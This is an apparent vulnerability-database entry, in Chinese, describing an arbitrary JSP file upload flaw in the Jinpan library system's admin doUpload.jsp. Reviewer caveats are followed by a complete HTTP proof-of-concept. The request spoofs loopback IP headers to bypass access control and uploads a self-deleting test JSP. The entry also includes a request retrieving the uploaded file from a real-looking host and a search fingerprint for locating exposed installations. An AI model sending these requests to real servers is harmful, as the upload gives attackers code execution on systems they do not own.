---
source: "wy876 漏洞文库"
title: "金盘图书馆系统 admin doUpload.jsp任意上传"
product: "金盘图书馆系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "版本未知，JSP执行目录及代理头信任条件"
prerequisites: "未说明，伪造多种回环IP头"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/om1k8iewd86fg4op"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%87%91%E7%9B%98%E5%9B%BE%E4%B9%A6%E9%A6%86/%E9%87%91%E7%9B%98%E5%9B%BE%E4%B9%A6%E9%A6%86%E7%B3%BB%E7%BB%9FdoUpload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"/opac/opacRssCollect\""
id: "vw-7d154b9aeac28341affab144"
entity_id: "ve-7d154b9aeac28341affab144"
schema_version: "1"
---

# 金盘图书馆系统 admin doUpload.jsp任意上传

## 条目说明

- 对象与具体问题：金盘图书馆系统；admin doUpload.jsp任意上传
- 版本、配置及部署条件：版本未知，JSP执行目录及代理头信任条件
- 认证与权限前提：未说明，伪造多种回环IP头
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 多种客户端IP头同时设置不能证明哪个绕过访问控制，需鉴权/代理配置分析
- JSP乘法后自删除，有写入/自删除副作用；外部YAML未下载，不能称脚本已审
- Hunter错入fofa，无补丁/版本

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
金盘图书馆系统doUpload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 金盘图书馆系统

## 三、资产测绘
+ hunter`web.body="/opac/opacRssCollect"`
+ 特征


## 四、漏洞复现
```http
POST /pages/admin/tools/uploadFile/doUpload.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=----xbkdgks1fwucvok84tce
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1

------xbkdgks1fwucvok84tce
Content-Disposition: form-data; name="file";filename="tvrodinjqx.jsp"

<%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------xbkdgks1fwucvok84tce--
```

> 请求长度说明：原资料 Content-Length 为 235；静态长度已移除，应由客户端根据最终请求体的字节数生成。


上传文件位置

```http
GET /upload/2024-01-24/1706077745930.jsp HTTP/1.1
Host: 42.247.6.28:9090
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1
```


[金盘图书馆系统-doupload-任意文件上传.yaml](https://www.yuque.com/attachments/yuque/0/2024/yaml/1622799/1709222151277-db0f2eb8-6fd5-4fbe-957a-bab7b52f6727.yaml)


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/om1k8iewd86fg4op>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
